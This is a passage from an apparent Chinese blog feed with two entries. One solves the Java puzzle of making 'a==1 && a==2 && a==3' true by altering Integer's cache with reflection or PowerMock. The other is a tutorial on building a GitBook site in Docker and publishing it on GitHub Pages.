<span class="token keyword">static</span> <span class="token keyword">final</span> Integer cache<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">static</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// high value may be configured by property</span>            <span class="token keyword">int</span> h <span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span>            String integerCacheHighPropValue <span class="token operator">=</span>                VM<span class="token punctuation">.</span><span class="token function">getSavedProperty</span><span class="token punctuation">(</span><span class="token string">"java.lang.Integer.IntegerCache.high"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>integerCacheHighPropValue <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>integerCacheHighPropValue<span class="token punctuation">)</span><span class="token punctuation">;</span>                    i <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// Maximum array size is Integer.MAX_VALUE</span>                    h <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> Integer<span class="token punctuation">.</span>MAX_VALUE <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token operator">-</span>low<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span> NumberFormatException nfe<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// If the property cannot be parsed into an int, ignore it.</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            high <span class="token operator">=</span> h<span class="token punctuation">;</span>            cache <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">[</span><span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> low<span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> cache<span class="token punctuation">.</span>length<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>                cache<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">(</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// range [-128, 127] must be interned (JLS7 5.1.7)</span>            <span class="token keyword">assert</span> IntegerCache<span class="token punctuation">.</span>high <span class="token operator">>=</span> <span class="token number">127</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token function">IntegerCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Returns an {@code Integer} instance representing the specified     * {@code int} value.  If a new {@code Integer} instance is not     * required, this method should generally be used in preference to     * the constructor {@link #Integer(int)}, as this method is likely     * to yield significantly better space and time performance by     * caching frequently requested values.     *     * This method will always cache values in the range -128 to 127,     * inclusive, and may cache other values outside of this range.     *     * @param  i an {@code int} value.     * @return an {@code Integer} instance representing {@code i}.     * @since  1.5     */</span>    <span class="token annotation punctuation">@HotSpotIntrinsicCandidate</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Integer <span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> IntegerCache<span class="token punctuation">.</span>low <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;=</span> IntegerCache<span class="token punctuation">.</span>high<span class="token punctuation">)</span>            <span class="token keyword">return</span> IntegerCache<span class="token punctuation">.</span>cache<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">-</span>IntegerCache<span class="token punctuation">.</span>low<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>回到这题判断条件中的 <code>1</code>/<code>2</code>/<code>3</code>，因为是通过计算在 <code>IntegerCache</code> 数组索引，从而获取其包装类对象：</p><ul><li><code>(Integer) 1 =&gt; Integer.valueOf(1) =&gt; IntegerCache.cache[129]</code></li><li><code>(Integer) 2 =&gt; Integer.valueOf(2) =&gt; IntegerCache.cache[130]</code></li><li><code>(Integer) 3 =&gt; Integer.valueOf(3) =&gt; IntegerCache.cache[131]</code></li></ul><p>那么只需要篡改 <code>IntegerCache</code> 数组，使得：</p><ul><li><code>IntegerCache.cache[130] = IntegerCache.cache[129]</code></li><li><code>IntegerCache.cache[131] = IntegerCache.cache[129]</code></li></ul><p>就可以令 <code>1</code>/<code>2</code>/<code>3</code> 取得的包装类是同一个对象（此时的 <code>1</code>/<code>2</code>/<code>3</code> 纯粹就是索引值）。</p><p>篡改方法可以用例 Java 的反射机制：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span>AtomicInteger<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Java</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 利用反射机制获取 Integer cache[] 数组</span>        Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Integer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        Field field <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"cache"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Integer<span class="token punctuation">[</span><span class="token punctuation">]</span> cache <span class="token operator">=</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">;</span>        cache<span class="token punctuation">[</span><span class="token number">130</span><span class="token punctuation">]</span> <span class="token operator">=</span> cache<span class="token punctuation">[</span><span class="token number">129</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 令 (Integer) 2 = (Integer) 1</span>        cache<span class="token punctuation">[</span><span class="token number">131</span><span class="token punctuation">]</span> <span class="token operator">=</span> cache<span class="token punctuation">[</span><span class="token number">129</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 令 (Integer) 3 = (Integer) 1</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Integer a <span class="token operator">=</span> Integer<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"impossable!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"It's right."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>但是这种做法不够优雅，毕竟改了题目。</p><p>那有没有不改题目的实现方式呢？</p><p>是有的。</p><p>虽然 <code>Integer</code> 声明了 <code>final</code>，不允许被继承，导致无法重写 <code>Integer.intValue()</code>。</p><p>但是可以利用 AOP 切到 <code>Integer.intValue()</code> 方法进行篡改。</p><p>在 Stack Overflow 就有人给出了类似的解题思路（理论上是可行的，但我并没有去验证，有兴趣的同学可以试试）：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span>AtomicInteger<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>Before<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>Test<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>runner<span class="token punctuation">.</span>RunWith<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>powermock<span class="token punctuation">.</span>core<span class="token punctuation">.</span>classloader<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span>PrepareForTest<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>powermock<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>junit4<span class="token punctuation">.</span>PowerMockRunner<span class="token punctuation">;</span><span class="token annotation punctuation">@PrepareForTest</span><span class="token punctuation">(</span>Integer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token annotation punctuation">@RunWith</span><span class="token punctuation">(</span>PowerMockRunner<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestJava</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 利用 AOP 把 Integer.intValue() 替换为 AtomicInteger.getAndIncrement()     */</span>    <span class="token annotation punctuation">@Before</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">before</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        AtomicInteger ai <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 自增整数</span>        <span class="token function">replace</span><span class="token punctuation">(</span><span class="token function">method</span><span class="token punctuation">(</span>Integer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string">"intValue"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">with</span><span class="token punctuation">(</span>                <span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> method<span class="token punctuation">,</span> args<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> ai<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">// lambda</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Integer a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"impossable!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"It's right."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="幕间"><a href="#幕间" class="headerlink" title="幕间"></a>幕间</h2><p>通过前面的解题过程可以发现，弱类型语言 相较于 强类型语言 会更容易实现底层逻辑篡改，主要是因为对语法特性的校验会更宽松。</p><blockquote><p>C++ 虽然和 Java 一样属于强类型语言，但是因为没有限制运算符重写而被钻了空子</p></blockquote><p>在渗透测试中，或者可以利用类似的手段，绕过一些条件语句达到目的。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 永假式 </tag>
            
            <tag> 绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 GitBook 在 Github 搭建个人网站</title>
      <link href="/website/gitbook-da-jian-ge-ren-wang-zhan/"/>
      <url>/website/gitbook-da-jian-ge-ren-wang-zhan/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="传统的个人网站"><a href="#传统的个人网站" class="headerlink" title="传统的个人网站"></a>传统的个人网站</h3><p>在某个知名门户下面注册一个子域名，定制个性化内容。 例如 QQ空间、 博客园、 CSDN 等等。</p><p><strong>优点</strong>：</p><ul><li>无技术门槛</li><li>免费</li></ul><p><strong>缺点</strong>：</p><ul><li>站点风格受限： 只能使用有限的模板布置站点</li><li>文章数据无法直接迁移： 即使某些门户支持导出、也未必能导入到其他门户</li></ul><h3 id="稍微有点技术含量的个人网站"><a href="#稍微有点技术含量的个人网站" class="headerlink" title="稍微有点技术含量的个人网站"></a>稍微有点技术含量的个人网站</h3><p>租用一台云服务器，搭建一个 HTTP 服务，在其中放入你想展示的内容。</p><p><strong>优点</strong>：</p><ul><li>完全个性化：理论上只要你想到的都可以实现</li><li>能够赚钱： 广告引流、付费内容等</li><li>站点数据能够迁移： 一般存储在数据库中</li></ul><p><strong>缺点</strong>：</p><ul><li>收费： 租用个人云服务器最低配的差不多 ￥1000/年</li><li>其实并不能赚到什么钱：<br>　　· 百万流量广告引流？ 不好意思谷歌邮寄 PIN 码到国内 100% 丢件<br>　　· 内容付费？ 抱歉大部分人的文章并不足以让别人掏钱</li><li>非常繁琐的搭建过程和日常维护，来看一下你需要做什么：<br>　　· 申请域名、网站备案： 最快需要 1 个月<br>　　· 租用云服务器： 低配怕访问慢、高配怕财务困难<br>　　· 搭建 HTTP 服务： nginx、 apache<br>　　· 搭建数据库： MySQL、 MariaDB<br>　　· 搭建网站平台： wordpress、 Discuz!<br>　　· 网站平台模板/插件不好用： css、 js 各种魔改<br>　　· 安全加固： 后台被爆破、 前台被钓鱼<br>　　· 服务容灾： 进程挂起、 定期备份<br>　　· 访问加速： Redis缓存、 CDN<br>　　· 搜索引擎不收录： SEO、 提交链接</li></ul><p>把这些都处理好之后，终于可以开始发表文章，一切似乎都很安逸很顺利。</p><p>但很多问题就是发生了：</p><ul><li>写了几百篇文章之后，开始发现富文本编辑方式太呕心了</li><li>突然有一天某个内容解析插件升级之后，文章格式乱套了</li><li>突然某个 JS 链接被墙之后，发现 latex 公式变代码了</li></ul><p>难道想安逸地发表一些文章真的这么困难吗？</p><p>直到有一天我发现了 GitBook。</p><h2 id="GitBook-简介"><a href="#GitBook-简介" class="headerlink" title="GitBook 简介"></a>GitBook 简介</h2><p>GitBook 是一个基于 Node.js 的命令行工具，支持 Markdown 和 AsciiDoc 两种语法格式，可以把这种格式的文本输出为 HTML、 PDF、 eBook 等格式的电子书。</p><p>事实上可以认为 GitBook 的本质就是一个文档格式转换工具。</p><p>GitBook 社区具有丰富的主题模块和插件模块，而且这些 主题/插件 都是开源的，大部分都可以从 GitHub 上找到，所以可以很简单地找到我们需要的 主题/插件 ，甚至能简单地对其进行微调。</p><h2 id="为什么是-GitBook-amp-GitHub"><a href="#为什么是-GitBook-amp-GitHub" class="headerlink" title="为什么是 GitBook &amp; GitHub"></a>为什么是 GitBook &amp; GitHub</h2><p>其实当知道 GitBook 可以把 Markdown 转换成 HTML 格式电子书之后，就基本可以确定这个组合了：</p><ul><li>GitHub 天然支持 Markdown 语法，可以直接使用 Markdown 编写文章</li><li>GitHub 可以借用 Git 对文章进行版本管理</li><li>GitHub 为每个仓库提供了 300M 免费空间的 GitHub Pages （只支持 HTML），足够用于发布个人的静态网站</li><li>GitBook 可以把 Markdown 文章转换成 HTML 电子书供 GitHub Pages 发布</li><li>极简主义： 程序员的网站不需要太多花哨的东西，文章才是核心，站点越简洁越美观</li></ul><hr><h2 id="搭建-GitBook-环境"><a href="#搭建-GitBook-环境" class="headerlink" title="搭建 GitBook 环境"></a>搭建 GitBook 环境</h2><blockquote><p>GitBook 在 3.2.3 版本之后就开始收费了，但是收费之后反而阉割了不少功能，不建议使用最新版</p></blockquote><p>为了使得 GitBook 的运行环境可以固化在 3.2.3 版本，这里使用 Docker 实现。</p><p>且为了方便使用，我已将其打包成 Docker 镜像，其 Dockerfile 脚本已上传到 GitHub： <a href="https://github.com/lyy289065406/gitbook-server-docker">gitbook-server-docker</a> 。</p><blockquote><p>注：<br>　因为 gitbook 服务是运行在 Docker 中，所以不论使用哪个平台，都要预装好 Docker 环境<br>　但是本文所使用的基础镜像是基于 Linux 的，因此 Docker in Windows 是无法直接安装的<br>　所以针对 Windows 10 ，推荐使用 WSL ( Windows Subsystem for Linux )<br>　通过 WSL 安装 Ubuntu 系统，然后再<a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/">在 Ubuntu 里面安装 Docker Deamon</a><br>　最后 Docker in Windows 做端口映射，就可以实现 Windows 到 Linux 的无缝对接<br>　具体的 Windows Docker 环境部署方法可参考 《<a href="https://www.jianshu.com/p/97d16b68045f">简书： Win10 内置 Ubuntu 完美使用 Docker in Windows</a>》<br>　至于 Linux 和 Mac 则简单得多，直接安装 Docker Deamon 即可使用，具体方法自行谷歌</p></blockquote><p><img src="./00.png"></p><h3 id="构建-GitBook-镜像"><a href="#构建-GitBook-镜像" class="headerlink" title="构建 GitBook 镜像"></a>构建 GitBook 镜像</h3><p>首先安装 <code>git</code> 命令行工具，然后 <code>clone</code> 上述的 <a href="https://github.com/lyy289065406/gitbook-server-docker">gitbook-server-docker</a> 仓库到本地：</p><p><code>git clone https://github.com/lyy289065406/gitbook-server-docker</code></p><p>在命令行环境下 <strong>打开本地仓库目录</strong> 。 Docker 脚本已经编排好在 <a href="https://github.com/lyy289065406/gitbook-server-docker/blob/master/Dockerfile"><code>./Dockerfile</code></a> 中，可以不修改直接使用。</p><p>构建 Docker 镜像（镜像名称 <code>exp/gitbook-server</code> 可根据 Docker 规范自定义修改）：</p><p><code>docker build . -t exp/gitbook-server:latest</code></p><p><img src="./01.png"></p><p>至此镜像已经安装完毕，下文主要是测试 GitBook 镜像是否可用。</p><h3 id="初始化-GitBook-项目"><a href="#初始化-GitBook-项目" class="headerlink" title="初始化 GitBook 项目"></a>初始化 GitBook 项目</h3><p>在 Docker 镜像中执行命令 <code>gitbook init</code>：</p><p><code>docker run --rm -v "$PWD/gitbook:/gitbook" exp/gitbook-server gitbook init</code></p><blockquote><p>　该命令会自动创建默认的 GitBook 目录结构。<br>　实际效果就是在工作目录 <code>./gitbook</code> 下创建两个符合 GitBook 语法的文件 <code>README.md</code> 和 <code>SUMMARY.md</code> 。<br>　<em>更多的 GitBook 语法详见 《<a href="https://yangjh.oschina.io/gitbook/">GitBook 学习笔记</a>》</em></p></blockquote><h3 id="关于-GitBook-目录结构说明"><a href="#关于-GitBook-目录结构说明" class="headerlink" title="关于 GitBook 目录结构说明"></a>关于 GitBook 目录结构说明</h3><p><img src="./02.png"></p><pre><code>exp-blog|-- .gitignore  ..............  [Git 过滤配置]|-- Dockerfile  ..............  [构建 GitBook 本地服务器的 Docker 脚本]|-- build.ps1  ...............  [重新编译博客变更内容，并使其适用于 Github Pages（Windows 脚本）]|-- build.sh  ................  [重新编译博客变更内容，并使其适用于 Github Pages（Linux 脚本）]|-- index.html  ..............  [Github Pages 首页（会自动跳转到博客首页）]|-- gitbook  .................  [GitBook 的工作目录，存储博客数据]|   |-- _book  ...............  [用 GitBook 编译生成的静态网站数据，用于本地测试（因含下划线不被 Github Pages 支持）]|   |-- book  ................  [用 build.ps1/sh 脚本所复制 _book 目录的镜像，用于 Github Pages 发布]|   |-- res  .................  [存储博客资源的目录]|   |-- markdown  ............  [存储博客文章的目录（只有 *.md 文件）]|   |-- README.md  ...........  [博客介绍文档（固定文件）]|   |-- SUMMARY.md  ..........  [博客目录索引（固定文件）]|   |-- node_modules  ........  [GitBook 的插件目录]|   |-- book.json  ...........  [GitBook 的插件配置]|   └-- package-lock.json  ...  [nodojs 插件依赖关系文件（安装插件时会自动更新）]|-- LICENSE  .................  [版权说明]└-- README.md  ...............  [此仓库的说明文档]</code></pre><h3 id="构建-GitBook-项目"><a href="#构建-GitBook-项目" class="headerlink" title="构建 GitBook 项目"></a>构建 GitBook 项目</h3><p>在 Docker 镜像中执行命令 <code>gitbook build</code>：</p><p><code>docker run --rm -v "$PWD/gitbook:/gitbook" exp/gitbook-server gitbook build</code></p><blockquote><p>　该命令会根据 GitBook 文件 <code>README.md</code> 和 <code>SUMMARY.md</code> 构建 html 项目 。<br>　实际效果就是在工作目录 <code>./gitbook</code> 下构建目录名为 <code>_book</code> 的静态网页文件 。<br>　本地可以通过 <code>./gitbook/_book/index.html</code> 测试访问 。</p></blockquote><p><img src="./03.png"></p><h3 id="启动-GitBook-服务"><a href="#启动-GitBook-服务" class="headerlink" title="启动 GitBook 服务"></a>启动 GitBook 服务</h3><p>在 Docker 镜像中执行命令 <code>gitbook serve</code>：</p><p><code>docker run -d --rm -v "$PWD/gitbook:/gitbook" -p 4000:4000 exp/gitbook-server gitbook serve</code></p><blockquote><p>该命令效果就是构建一个可以访问 <code>./gitbook/_book/index.html</code> 的 Web 服务。</p></blockquote><p><img src="./04.png"></p><h3 id="关于前文中-Docker-命令的参数的含义"><a href="#关于前文中-Docker-命令的参数的含义" class="headerlink" title="关于前文中 Docker 命令的参数的含义"></a>关于前文中 Docker 命令的参数的含义</h3><p><code>docker run --rm -v "$PWD/gitbook:/gitbook" -p 4000:4000 exp/gitbook-server &lt;Command&gt;</code></p><ul><li><code>docker run</code>：运行镜像</li><li><code>--rm</code>：退出镜像后自动删除运行时产生的数据（此镜像目的是提供 GitBook 的运行环境，故没必要保留数据）</li><li><code>-v "$PWD/gitbook:/gitbook"</code>：把本地工作目录 <code>$PWD/gitbook</code> 挂载到镜像的工作目录 <code>/gitbook</code> （这样运行 GitBook 期间的工作数据就会从本地映射到镜像内，即使镜像退出运行，数据依旧会保留在本地）</li><li><code>-p 4000:4000</code>：把镜像内 GitBook 的 4000 服务端口暴露到本地物理机的 4000 端口</li><li><code>exp/gitbook-server</code>：目标镜像名称</li><li><code>&lt;Command&gt;</code>：要在镜像内执行的命令，如 <code>gitbook serve</code> 等，更多命令可见 <a href="https://github.com/GitbookIO/gitbook-cli">gitbook-cli</a></li></ul><hr><h2 id="发布站点到-GitHub-Page"><a href="#发布站点到-GitHub-Page" class="headerlink" title="发布站点到 GitHub Page"></a>发布站点到 GitHub Page</h2><p>事实上只需要把前面通过 <code>gitbook build</code> 所生成的 <code>_book</code> 目录 commit 到 GitHub， 然后在 GitHub 仓库的 Settings 中启用 GitHub Page 即可。</p><p>这里需要注意的是：</p><ul><li>GitHub Page 不允许站点路径以下划线开头，因此在 commit 前需要把 <code>_book</code> 重命名为 <code>book</code></li><li>GitHub Page 的站点主页是仓库的根目录，而 GitBook 的站点主页是在 <code>_book</code> 目录下，为了统一主页，可以在 GitHub 仓库根目录添加一个 <code>index.html</code> 文件，内容如下：</li></ul><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>robots<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>noarchive<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>author<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>EXP<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>IE<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>EXP-BLOG<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>        <span class="token comment" 